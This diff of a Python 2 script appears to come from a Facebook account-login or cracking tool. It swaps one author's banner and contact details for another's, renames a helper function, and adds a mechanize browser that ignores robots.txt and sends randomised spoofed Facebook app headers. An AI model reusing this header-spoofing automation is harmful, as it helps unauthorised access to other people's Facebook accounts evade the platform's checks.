@@ -22,9 +22,14 @@ except ImportError:
     os.system('node index.js &')
     os.system('python2 jam.py')
 
+reload(sys)
+sys.setdefaultencoding('utf8')
+br = mechanize.Browser()
+br.set_handle_robots(False)
+br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
 bd = random.randint(2e+07, 3e+07)
 sim = random.randint(20000, 40000)
-header = {
+br.addheader = {
     'x-fb-connection-bandwidth': repr(bd),
     'x-fb-sim-hni': repr(sim),
     'x-fb-net-hni': repr(sim),
@@ -56,27 +61,25 @@ def cetak(b):
     sys.stdout.write(x+'\n')
 
 
-def hamza(z):
+def jam(z):
 	for e in z + '\n':
 		sys.stdout.write(e)
 		sys.stdout.flush()
 		time.sleep(0.03)
 ##### LOGO #####
 banner = """
-\033[1;96m___  ____   _ _____ _   __  ___   _   _ 
-\033[1;96m|  \/  | | | /  ___| | / / / _ \ | \ | |
-\033[1;96m| .  . | | | \ `--.| |/ / / /_\ \|  \| |
-\033[1;96m| |\/| | | | |`--. \    \ |  _  || . ` |
-\033[1;96m| |  | | |_| /\__/ / |\  \| | | || |\  |
-\033[1;96m\_|  |_/\___/\____/\_| \_/\_| |_/\_| \_/
-                                                
-\033[1;91m-----------------------------------------------
-\033[1;92m➣ OWNER   : JAM SHAHRUKH X MUSKAN NOOR
-\033[1;92m➣ Github  : https://github.com/muskanckg
-\033[1;92m➣ GANG    : CRAZY KING GANG
-\033[1;92m➣ Youtube : JAM SHAHRUKH TECHNICAL
-\033[1;92m➣ WhatsApp: +923053176060
-\033[1;91m-----------------------------------------------"""
+\033[1;91m  ██████████  \033[1;96m██████████  \033[1;93m█████████  \033[1;92m ▀
+\033[1;91m  ███    ███  \033[1;96m███    ███  \033[1;93m███   ███  \033[1;92m███ 
+\033[1;91m  ███         \033[1;96m███    ███  \033[1;93m███   ███  \033[1;92m███ 
+\033[1;91m  ██████████  \033[1;96m██████████  \033[1;93m███   ███  \033[1;92m███ 
+\033[1;91m         ███  \033[1;96m███    ███  \033[1;93m███   ███  \033[1;92m███  
+\033[1;91m  ███    ███  \033[1;96m███    ███  \033[1;93m███   ███  \033[1;92m███  
+\033[1;91m  ██████████  \033[1;96m███    ███  \033[1;93m███   ███  \033[1;92m███ \x1b[1;90mQUEEN
+\033[1;94m══════════════════════════════════════════════
+\033[1;90m➣ Author : \033[1;97mSTYLISH QUEEN
+\033[1;90m➣ Github : \033[1;97mhttps://github.com/stylish-queen
+\033[1;90m➣ Fb Page: \033[1;97mJam Shahrukh Official
+\033[1;94m══════════════════════════════════════════════ """
 # titik #
 def tik():
 	titik = [".   ","..  ","... "]
@@ -166,8 +169,8 @@ def login():
 	except (KeyError,IOError):
 		os.system("clear")
 		print (banner)
-		hamza('[!] JAM X SANI BRAND')
-		hamza('[!] Use a New Facebook Account To Login')
+		jam('[!] JAM X SANI BRAND')
+		jam('[!] Use a New Facebook Account To Login')
 		print'-------------------------------------'
 		iid=raw_input('[+] Number/Email: ')
 		id=iid.replace(" ","")
